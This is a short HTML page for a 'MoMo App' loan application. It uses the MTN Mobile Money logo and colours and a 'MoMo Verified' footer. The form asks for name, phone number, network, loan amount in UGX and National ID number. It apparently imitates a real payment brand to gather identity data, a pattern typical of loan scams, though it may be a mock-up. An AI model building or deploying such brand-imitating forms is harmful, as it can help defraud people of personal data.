<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MoMo App</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #0d5c73; /* Blue sides */
}

/* HEADER */
.header {
  background: #0d5c73;
  color: #ffcc00;
  text-align: center;
  padding: 15px;
  font-size: 20px;
  font-weight: bold;
}

.header img {
  width: 40px;
  vertical-align: middle;
  margin-right: 10px;
}

/* MAIN FORM AREA */
.main {
  background: #ffcc00;
  min-height: 100vh;
  padding: 20px;
}

.container {
  background: white;
  padding: 20px;
  border-radius: 15px;
  max-width: 400px;
  margin: auto;
}

h2 {
  text-align: center;
}

/* INPUTS */
input, select {
  width: 100%;
  padding: 14px;
  margin: 10px 0;
  border-radius: 8px;
  border: none;
  background: #f2f2f2;
  font-size: 14px;
}

/* BUTTON */
button {
  width: 100%;
  padding: 14px;
  background: #ffcc00;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

button:active {
  background: #e6b800;
}

/* FOOTER */
.footer {
  text-align: center;
  font-size: 12px;
  color: white;
  padding: 15px;
}
</style>
</head>

<body>

<!-- HEADER -->
<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/MTN_Mobile_Money_logo.svg">
  MoMo App
</div>

<!-- MAIN -->
<div class="main">

  <div class="container">
    <h2>Loan Application</h2>

    <form action="/apply" method="POST">
      <input type="text" name="name" placeholder="Full Name" required>

      <input type="text" name="phone" placeholder="Phone Number (07XXXXXXXX)" required>

      <select name="network" required>
        <option value="">Select Network</option>
        <option value="MTN">MTN</option>
        <option value="Airtel">Airtel</option>
      </select>

      <input type="number" name="amount" placeholder="Loan Amount (UGX)" required>

      <input type="text" name="nationalId" placeholder="National ID Number" required>

      <button type="submit">Apply Now</button>
    </form>

  </div>

</div>

<!-- FOOTER -->
<div class="footer">
  2026 @ MoMo Verified
</div>

</body>
</html>
